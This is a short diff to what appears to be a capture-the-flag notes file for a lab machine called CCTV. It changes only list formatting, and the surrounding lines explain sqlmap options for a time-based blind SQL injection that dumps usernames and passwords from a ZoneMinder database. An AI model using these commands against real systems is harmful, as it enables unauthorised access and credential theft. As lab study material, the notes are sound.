@@ -12,7 +12,7 @@ sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=remove
 ```
 Used on: **CCTV**
 
-- `-p tid` — force injection on the `tid` parameter
+`-p tid` — force injection on the `tid` parameter
 - `--dbms=mysql` — hint the backend
 - `--batch` — no interactive prompts
 - `--cookie` — reuse the authenticated session cookie
@@ -27,7 +27,7 @@ sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=remove
 ```
 Used on: **CCTV**
 
-- `-D zm -T Users -C Username,Password` — narrow target
+`-D zm -T Users -C Username,Password` — narrow target
 - `--technique=T` — time-based blind only
 - `--time-sec=2` — delay threshold used for inference
 
